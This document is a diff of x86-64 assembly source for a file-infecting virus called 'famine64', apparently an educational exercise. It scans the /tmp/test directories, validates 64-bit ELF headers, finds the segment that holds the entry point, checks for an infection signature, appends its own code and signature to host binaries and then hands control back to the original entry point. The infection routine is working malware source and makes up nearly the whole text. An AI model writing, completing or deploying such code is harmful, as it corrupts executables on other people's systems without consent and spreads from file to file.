@@ -8,18 +8,21 @@
 	%define SYS_LSEEK		8
 	%define SYS_MMAP		9
 	%define SYS_MUNMAP		11
-	%define SYS_UNLINK		87
 	%define SYS_GETDENTS64	217
 	%define MAKE_EXECUTABLE_DEBUGGABLE
 	global famine64_func:function
 	global famine64_size:data
+	global famine64_signature:data
 
 	segment .text
 
 famine64_func:
+	famine64_signature dq 0x42CAFE4224EFAC24
+
 	push	rax
 	push	rdi
 	sub		rsp, 0x10
+	jmp famine64_end
 
 	mov		QWORD[rsp], 0
 dir_loop:
@@ -296,19 +299,11 @@ get_dat_elf_end:
 ;;                                                                            ;;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 check_file:
-	push	rbp
-	mov		rbp, rsp
-
 	xor		rax, rax
+	;; Check header integrity
 	cmp		rdi, 0x3f				; size < sizeof(Elf64_Ehdr)
-	ja		check_end
-	cmp		BYTE [rsi], 0x7f		; ->e_ident[0] != 0x7f
-	jne		check_end
-	cmp		BYTE [rsi + 1], 'E'		; ->e_ident[1] != 'E'
-	jne		check_end
-	cmp		BYTE [rsi + 2], 'L'		; ->e_ident[2] != 'L'
-	jne		check_end
-	cmp		BYTE [rsi + 3], 'F'		; ->e_ident[3] != 'F'
+	jl		check_end
+	cmp		DWORD [rsi], 0x464c457f	; ->e_ident != 0x7fELF
 	jne		check_end
 	cmp		BYTE [rsi + 4], 2		; ->e_ident[EI_CLASS] != ELFCLASS64
 	jne		check_end
@@ -316,16 +311,38 @@ check_file:
 	je		check_end
 	cmp		BYTE [rsi + 6], 1		; ->e_ident[EI_VERSION] != EV_CURRENT
 	jne		check_end
-	movzx	edx, BYTE [rsi + 16]	; ->e_type != ET_EXEC && ->e_type != ET_DYN
+	movzx	edx, WORD [rsi + 16]	; ->e_type != ET_EXEC && ->e_type != ET_DYN
 	sub		edx, 2
 	cmp		dl, 1
 	ja		check_end
-	cmp		BYTE [rsi + ], 
+	cmp		WORD [rsi + 18], 0x3e	; ->e_machine != EM_X86_64
 	jne		check_end
-
+	;; Check offsets integrity
+	cmp		QWORD [rsi + 32], 64	; ->e_phoff != sizeof(Elf64_Ehdr)
+	jne		check_end
+	movzx	edx, WORD [rsi + 56]	; ->e_phnum
+	imul	edx, 56					; ->e_phnum * sizeof(Elf64_Phdr)
+	add		rdx, QWORD [rsi + 32]	; ... + ->e_phoff
+	cmp		rdx, rdi				; ... > size
+	ja		check_end
+	cmp		QWORD [rsi + 40], 64	; ->e_shoff < sizeof(Elf64_Ehdr)
+	jl		check_end
+	movzx	edx, WORD [rsi + 60]	; ->e_shnum
+	imul	edx, 64					; ->e_shnum * sizeof(Elf64_Shdr)
+	add		rdx, QWORD [rsi + 40]	; ... + ->e_shoff
+	cmp		rdx, rdi				; ... > size
+	ja		check_end
+	cmp		WORD [rsi + 52], 64		; ->e_ehsize != sizeof(Elf64_Ehdr)
+	jne		check_end
+	cmp		WORD [rsi + 54], 56		; ->e_phentsize != sizeof(Elf64_Phdr)
+	jne		check_end
+	cmp		WORD [rsi + 58], 64		; ->e_shentsize != sizeof(Elf64_Shdr)
+	jne		check_end
+	movzx	edx, WORD [rsi + 60]	; ->e_shnum
+	cmp		WORD [rsi + 62], dx		; ->e_shstrndx >= ->e_shnum
+	jae		check_end
 	mov		rax, 1
 check_end:
-	pop		rbp
 	ret
 
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
@@ -334,42 +351,17 @@ check_end:
 ;;                                                                            ;;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 infect_file:
-	cmp		BYTE [rdx], 0x7f		; compare \x7fELF
-	jne		infect_file_end
-	cmp		BYTE [rdx + 1], 'E'
-	jne		infect_file_end
-	cmp		BYTE [rdx + 2], 'L'
-	jne		infect_file_end
-	cmp		BYTE [rdx + 3], 'F'
-	jne		infect_file_end
-	cmp		BYTE [rdx + 4], 2		; ->e_ident[EI_CLASS] == ELFCLASS64
-	jne		infect_file_end
-	cmp		BYTE [rdx + 5], 0		; ->e_ident[EI_DATA] != ELFDATANONE
-	je		infect_file_end
-	cmp		BYTE [rdx + 6], 1		; ->e_ident[EI_VERSION] == EV_CURRENT
-	jne		infect_file_end
-	movzx	eax, BYTE [rdx + 16]	; ->e_type == ET_EXEC || ->e_type == ET_DYN
-	sub		eax, 2
-	cmp		al, 1
-	ja		infect_file_end
+	push	r15
+	push	r14
+	push	r13
+	push	r12
+	push	rbp
+	push	rbx
 
-	push		rax
-	push		rbx
-	push		rcx
-	push		rdx
-	push		rdi
-	push		rsi
-	push		r8
-	push		r9
-	push		r10
-	push		r11
-	push		r12
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	;; 1. Find the memory mapped PT_LOAD segment that contains entry point   ;;
 	;;    R8 will store it.                                                  ;;
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	;;    R8  : Program Header table start
-	;;    RCX : Program Header table end
 	mov		r8, QWORD [rdx + 32]	; ->e_phoff (size: 8)
 	lea		r8, [rdx + r8]			; Program Header table start
 	xor		rcx, rcx
@@ -377,22 +369,28 @@ infect_file:
 	xor		r9, r9
 	movzx	r9d, WORD [rdx + 54]	; hdr->e_phentsize
 	imul	rcx, r9
-	add		rcx, r8				; Program Header table end
+	add		rcx, r8					; Program Header table end
 	mov		r10, QWORD [rdx + 24]	; hdr->e_entry
+	;;    R8  : Program Header table start
+	;;    RCX : Program Header table end
+	;;    R10 : Entry Point
 	;; The first segment of an ELF file is full of \0 so w can skip it...
+	jmp		get_segment
 next_segment:
 	add		r8w, WORD [rdx + 54]	; move to next Program Header segment
-	cmp		rcx, r8					; end of Program Header segment ?
-	jle		infect_file_end_pop
+	cmp		r8, rcx					; end of Program Header segment ?
+	jge		infect_file_end_pop
 get_segment:
 	cmp		DWORD [r8], 1			; is it PT_LOAD segment ?
 	jne		next_segment
 	cmp		QWORD [r8 + 16], r10	; segment->p_vaddr > hdr->e_entry ?
 	jg		next_segment
 	mov		r9, QWORD [r8 + 16]		; segment->p_vaddr
-	add		r9, QWORD [r8 + 32]		; segment->p_vaddr + segment->p_filesz
-	cmp		r9, r10					; segment->p_vaddr + segment->p_filesz < hdr->e_entry ?
+	add		r9, QWORD [r8 + 32]		; ... + segment->p_filesz
+	cmp		r9, r10					; ... < hdr->e_entry ?
 	jl		next_segment
+	cmp		r8, rcx					; Did we reached the end without founding
+	jge		infect_file_end_pop		; the entry point segment ?
 
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	;; 2. Check if the file is already infected                              ;;
@@ -405,7 +403,7 @@ check_signature:
 	add		r9, rsi					; *data + data size
 	sub		r9, 9					; *data + data size - signature size - 1
 	mov		r9, QWORD [r9]			; [data + data size - signature size - 1]
-	cmp		r9, QWORD [rel signature]
+	cmp		r9, QWORD [rel famine64_signature]
 	je		infect_file_end_pop
 
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
@@ -432,16 +430,6 @@ check_signature:
 	;; RDI contains file_path addr
 	lea		rsi, [rsp + 52]
 	mov		rax, SYS_STAT
-	syscall
-	cmp		eax, 0
-	jne		infect_file_end_add
-
-	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	;; 4. Erase file from system tree before any changes !!!
-	;;    int unlink(char *pathname)
-	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	;;    RDI contains the file_path addr
-	mov		rax, SYS_UNLINK
 	syscall
 	cmp		eax, 0
 	jne		infect_file_end_add
@@ -677,7 +665,7 @@ write_end:
 
 	mov		rax, SYS_WRITE
 	mov		edi, DWORD [rsp]
-	lea		rsi, [rel signature]
+	lea		rsi, [rel famine64_signature]
 	mov		rdx, 8
 	syscall
 
@@ -688,17 +676,12 @@ write_end:
 infect_file_end_add:	
 	add		rsp, 188
 infect_file_end_pop:
-	pop		r12
-	pop		r11
-	pop		r10
-	pop		r9
-	pop		r8
-	pop		rsi
-	pop		rdi
-	pop		rdx
-	pop		rcx
 	pop		rbx
-	pop		rax
+	pop		rbp
+	pop		r12
+	pop		r13
+	pop		r14
+	pop		r15
 infect_file_end:
 	ret
 	
@@ -714,7 +697,7 @@ no_jump:
 
 	cmp		QWORD [rel jump_offset], 0x0	; No jump address if the executable is the first
 	je		do_ret
-	push		QWORD [rel jump_offset]
+	push	QWORD [rel jump_offset]
 do_ret:
 	ret
 
@@ -725,6 +708,5 @@ data:
 	dir_one db "/tmp/test/", 0
 	dir_two db "/tmp/test2/", 0
 	dir_all dq dir_one, dir_two, 0
-	signature dd 0x42CAFE42, 0x24EFAC24
 	jump_offset dq 0x00000000
 end_of_file:
